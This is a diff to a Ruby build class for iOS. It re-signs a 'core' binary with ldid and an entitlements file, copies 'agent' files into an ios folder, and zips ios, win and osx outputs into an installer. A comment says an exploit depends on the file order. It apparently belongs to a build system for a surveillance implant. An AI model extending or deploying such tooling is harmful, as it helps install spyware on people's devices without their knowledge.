@@ -32,7 +32,9 @@ class BuildIOS < Build
     super
 
     # realign the memory hashes after the binary patching
-    CrossPlatform.exec path('ldid.exe'), '-S' + path('ent.plist') + ' ' + path('core'), {:chdir => path('')}
+    CrossPlatform.exec path('build/ldid.exe'), '-S' + path('ent.plist') + ' ' + path('core'), {:chdir => path('build')}
+
+    @outputs = ['codesign_allocate', 'core', 'dylib', 'ent.plist', 'install.sh', 'ldid', 'config']
   end
 
   def scramble
@@ -93,17 +95,36 @@ class BuildIOS < Build
       end
     end
 
+    # create helper directories
+    FileUtils.mkdir path('ios')
+
+    # files for the agent
+    @outputs.each do |output|
+      FileUtils.cp path(output), path("ios/#{File.basename(output)}")
+    end
+
     # put it as the first file of the outputs, since the exploit relies on this
     @outputs.insert(0, 'output.zip')
-
   end
 
   def pack(params)
     trace :debug, "Build: pack: #{params}"
 
-    # we already have this file from the previous step
-    @outputs = ['output.zip']
+    Zip::ZipFile.open(path('installer.zip'), Zip::ZipFile::CREATE) do |z|
+      Dir[path('ios/**')].each do |file|
+        z.file.open("ios/#{File.basename(file)}", "wb") { |f| f.write File.open(file, 'rb') {|f| f.read} }
+      end
+      Dir[path('win/**')].each do |file|
+        z.file.open("win/#{File.basename(file)}", "wb") { |f| f.write File.open(file, 'rb') {|f| f.read} }
+      end
+      Dir[path('osx/**/**')].each do |file|
+        next if File.directory? file
+        z.file.open("#{file.gsub(path(''), '')}", "wb") { |f| f.write File.open(file, 'rb') {|f| f.read} }
+      end
+    end
 
+    # we already have this file from the previous step
+    @outputs = ['installer.zip']
   end
 
   def unique(core)
